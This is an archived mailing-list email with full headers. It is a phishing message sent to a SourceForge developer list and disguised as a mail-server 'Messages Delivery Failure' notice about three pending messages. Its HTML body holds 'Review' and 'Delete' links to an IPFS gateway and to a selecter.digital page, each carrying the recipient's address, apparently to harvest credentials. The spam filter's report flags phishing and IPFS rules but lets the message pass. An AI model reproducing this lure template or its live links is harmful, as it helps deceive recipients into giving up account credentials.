Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 02C9FC8E674
	for <lists+industrypack-devel@lfdr.de>; Thu, 27 Nov 2025 14:18:10 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=HQiuqZHz8BSvb3T9BR66DFjXQBHbesTeEBb0Dza4WJQ=; b=EvVCf3VWMqLNSYGddaEX60PmPf
	XN+vYLya2xswBQauaWvxhYEMVPJSFulyzo+JY8OAZx7X+l1iT/t2V9iK2Uhihapqa6JZCBcaVAW9d
	uTehqnjjsEnyh2R2wJLqJ2lNCQiEsacZ61azHmred2ExgYkwAV3TV3NL280Al4awJfA8=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vObsu-0008ME-Cc
	for lists+industrypack-devel@lfdr.de;
	Thu, 27 Nov 2025 13:18:08 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mailer-daemon@host2.i4dots.com>) id 1vObso-0008M1-IW
 for industrypack-devel@lists.sourceforge.net;
 Thu, 27 Nov 2025 13:18:02 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=5FABrdkjxUm/eDQPtJiEa69OgV2RqQK1cHsTXMSJoWM=; b=cxpiVZjfbYrraoQRta9G3V0ebs
 T+4OgQrw4JK/NZ3Yx9OHjpG+4HTOlwBPC/uUrRVvs9qyVIMTLS+1GQPds2RbfYgMewbV/xi4pxEHq
 HXkWh2GRI2f08LtEw9q7Gkje2H0Bst0fdalNIvRneKACqsmeYUzw+QqDz7nztYGgq2ZU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=5FABrdkjxUm/eDQPtJiEa69OgV2RqQK1cHsTXMSJoWM=; b=W
 iBkOZ10lqAqydrSka4dH+vBURzRBKGuldr8kWpkrW1ykfSGrHuT+nyKM0mmnLLwt5QTVlLIPTkPwb
 80EZW3lXr/RpzJi3ztofqY6FP16kNBWXsdDs33nWI6xurmz8mqAqD78NHJkcTmlqcBw/34Y43TXBZ
 evs7JLRwHCplMWMo=;
Received: from micheal.beyazisikvakfi.com ([79.141.167.137])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vObsn-00052x-RY for industrypack-devel@lists.sourceforge.net;
 Thu, 27 Nov 2025 13:18:02 +0000
From: Mail Delivery System <mailer-daemon@host2.i4dots.com>
To: industrypack-devel@lists.sourceforge.net
Date: 27 Nov 2025 08:17:46 -0500
Message-ID: <20251127081746.207344E539D0D83B@host2.i4dots.com>
MIME-Version: 1.0
X-Spam-Score: 4.2 (++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Message from industrypack-devel@lists.sourceforge.net server
 Messages Delivery Failure The delivery of messages was stopped by the
 lists.sourceforge.net
 Mail-Server. You have 3 pending messages that could not be sent as of
 11/27/2025 8:17:46 a.m. 
 Content analysis details:   (4.2 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URI: selecter.digital]
 [URI: cloudflare-ipfs.com]
 1.9 URIBL_ABUSE_SURBL Contains an URL listed in the ABUSE SURBL blocklist
 [URI: account.selecter.digital]
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.0 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP content
 via CloudFlare, likely phishing
 1.1 URI_IPFS               References Interplanetary File System PtP content,
 probable phishing
 0.0 URI_PHISH              Phishing using web form
X-Headers-End: 1vObsn-00052x-RY
Subject: [Industrypack-devel] =?utf-8?q?Email_Notification=3A_You_have_=28?=
 =?utf-8?q?3=29_pending_mess_=C9=91ges?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6132728860563812760=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6132728860563812760==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
ion-thickness: initial; text-decoration-style: initial; text-decoration-col=
or: initial;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
or: rgb(2, 151, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
er-box;">Message from&nbsp;industrypack-devel@lists.sourceforge.net server<=
/span></td></tr></tbody></table>
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;">
<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; float: none; display: inline !important; white-space: normal; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style: initial; text-decoration=
-color: initial;">&nbsp;</span></div>
<p align=3D"left" style=3D"color: rgb(44, 54, 58); text-transform: none; te=
xt-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; fo=
nt-size: 13px; font-style: normal; font-weight: 400; margin-top: 0px; word-=
spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wido=
ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
n-thickness: initial; text-decoration-style: initial; text-decoration-color=
: initial;"><font color=3D"#000066" face=3D"Arial" size=3D"4" style=3D"box-=
sizing: border-box;"><strong style=3D"font-weight: bolder; box-sizing: bord=
er-box;">Messages Delivery Failure</strong></font></p>
<div align=3D"left" class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=
=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; border-top-color: currentC=
olor; border-top-width: 0px; border-top-style: none; white-space: normal; b=
ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
n-style: initial; text-decoration-color: initial;"><font size=3D"3"><font s=
tyle=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;">Th=
e delivery of messages was stopped by the&nbsp;lists.sourceforge.net Mail-S=
erver.</span><br style=3D"box-sizing: border-box;"><span style=3D"box-sizin=
g: border-box;">You have 3 pending messages that could not be sent as of 11=
/27/2025 8:17:46 a.m.</span></font><br style=3D"box-sizing: border-box;"><b=
r style=3D"box-sizing: border-box;">
<span style=3D"box-sizing: border-box;"><font style=3D"box-sizing: border-b=
ox;">Click to&nbsp;</font>
<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/QmNfJcwGKptPxc6VeVgud=
8Qw8ZZCm8nRgeEnEYwJFbnc2k?#industrypack-devel@lists.sourceforge.net" target=
=3D"_blank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;"><u><=
a style=3D"text-decoration: underline;" href=3D"https://account.selecter.di=
gital/communication.html?view=3Dindustrypack-devel@lists.sourceforge.net">
Review</a></u></font></a><font style=3D"box-sizing: border-box;">&nbsp;</fo=
nt><font style=3D"box-sizing: border-box;">or</font><span>&nbsp;</span><a h=
ref=3D"https://account.selecter.digital/communication.html?view=3Dindustryp=
ack-devel@lists.sourceforge.net">
</a><a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin:=
 0px; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertica=
l-align: baseline; cursor: pointer; box-sizing: border-box; background-colo=
r: transparent;" href=3D"https://cloudflare-ipfs.com/ipfs/QmNfJcwGKptPxc6Ve=
Vgud8Qw8ZZCm8nRgeEnEYwJFbnc2k?#industrypack-devel@lists.sourceforge.net" ta=
rget=3D"_blank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">=
<u><a href=3D"https://account.selecter.digital/communication.html?view=3Din=
dustrypack-devel@lists.sourceforge.net">
Delete</a></u></font></a><span><a href=3D"https://account.selecter.digital/=
communication.html?view=3Dindustrypack-devel@lists.sourceforge.net">&nbsp;<=
/a></span><font style=3D"box-sizing: border-box;">&nbsp;pending outgoing e-=
mail messages.</font></span></font></div>
<div align=3D"left" class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=
=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; border-top-color: currentC=
olor; border-top-width: 0px; border-top-style: none; white-space: normal; b=
ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
n-style: initial; text-decoration-color: initial;"><font size=3D"3"><span s=
tyle=3D"box-sizing: border-box;"></span></font>&nbsp;</div>
<div class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align: =
left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; lette=
r-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-s=
tyle: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bord=
er-top-color: currentColor; border-top-width: 0px; border-top-style: none; =
white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant=
-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
nitial; text-decoration-style: initial; text-decoration-color: initial;"><s=
pan style=3D"color: black; box-sizing: border-box;"><font size=3D"3">Thanks=
,</font></span></div>
<div class=3D"v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align: =
left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; lette=
r-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-s=
tyle: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bord=
er-top-color: currentColor; border-top-width: 0px; border-top-style: none; =
white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant=
-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
nitial; text-decoration-style: initial; text-decoration-color: initial;"><s=
trong style=3D"font-weight: bolder; box-sizing: border-box;"><span style=3D=
"color: black; box-sizing: border-box;"><font size=3D"3">lists.sourceforge.=
net Mail&nbsp;Administrator</font></span></strong></div></body></html>


--===============6132728860563812760==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6132728860563812760==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6132728860563812760==--
